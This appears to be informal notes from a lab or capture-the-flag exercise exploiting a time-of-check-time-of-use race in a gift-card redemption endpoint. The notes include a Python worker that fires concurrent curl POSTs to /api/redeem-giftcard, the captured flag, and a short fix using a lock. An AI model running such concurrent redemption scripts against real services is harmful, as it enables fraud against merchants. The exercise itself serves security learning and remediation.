lets see ...
i am going to preform a white-box penetration testing instead of black-box this time 
there is one gift card so it cant be the logic flow where you can use multiple cards multiple times
lets see if it checks if the card is used or not 
it verifies it :
    state["giftcard_used"] = True
but also huge note here :
    time.sleep(0.25) 
its the same lab we solved before 
Time-Of-Check-Time-Of-Use
TOCTOU
i can re-use the script of it but with editing some lines of it
ohhh opus left another logic bug where if u just submit the gift-card even if u didnt do a checkout u cant use it again
changing the endpoint of the script to -> /api/redeem-giftcard
changing the port to -> 9004
changing the command card ->         ["curl", "-s", "--no-keepalive", "-X", "POST", f"{URL}/api/redeem-giftcard", "-H   ", "Content-Type: application/json", "-d", '{"code": "WELCOME100"}']
got error trying this :
import subprocess


def worker(i):
  barrier.wait()
  try:
    out = subprocess.check_output([
        "curl",
        "-s",
        "--no-keepalive",
        "-X",
        "POST",
        f"{URL}/api/redeem-giftcard",
        "-H",
        "Content-Type: application/json",
        "-d",
        '{"code": "WELCOME100"}',
    ])
    results[i] = out.decode().strip()
  except subprocess.CalledProcessError as e:
    results[i] = f"Error: {e.output.decode().strip()}"

it did work actually
got the flag : FLAG{r4c3_c0nd1t10n_1n_th3_ch3ck0ut}
fixing the 2 logic flows
TOCTOU Fix :
    import threading
    lock = threading.Lock()
    check first is done 
    removing sleep function
    done


